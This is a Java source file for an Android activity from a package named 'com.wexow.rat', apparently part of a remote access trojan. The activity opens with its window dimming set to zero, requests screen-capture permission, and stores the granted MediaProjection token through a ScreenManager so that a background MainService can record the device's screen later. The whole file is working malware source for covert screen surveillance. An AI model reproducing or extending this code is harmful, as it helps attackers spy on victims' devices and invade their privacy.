package com.wexow.rat;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.util.Log;

import com.wexow.rat.managers.ScreenManager;

public class ScreenCastActivity extends Activity {
    private static final String TAG = "ScreenCastActivity";
    private static final int REQ = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.e(TAG, "🚀 onCreate");

        getWindow().setDimAmount(0f);

        if (com.wexow.rat.core.MainService.getInstance() != null) {
            com.wexow.rat.core.MainService.getInstance().upgradeForMediaProjection();
        }

        try {
            MediaProjectionManager mpm = (MediaProjectionManager)
                getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            
            if (mpm != null) {
                Log.e(TAG, "🎯 Requesting permission");
                startActivityForResult(mpm.createScreenCaptureIntent(), REQ);
            } else {
                finish();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ " + e.getMessage(), e);
            finish();
        }
    }

    @Override
    protected void onActivityResult(int req, int result, Intent data) {
        Log.e(TAG, "📥 onActivityResult: " + result);
        
        if (req == REQ && result == RESULT_OK && data != null) {
            ScreenManager.saveProjection(getApplicationContext(), result, data);
            Log.e(TAG, "✅ MediaProjection saved");
        }
        finish();
    }
}
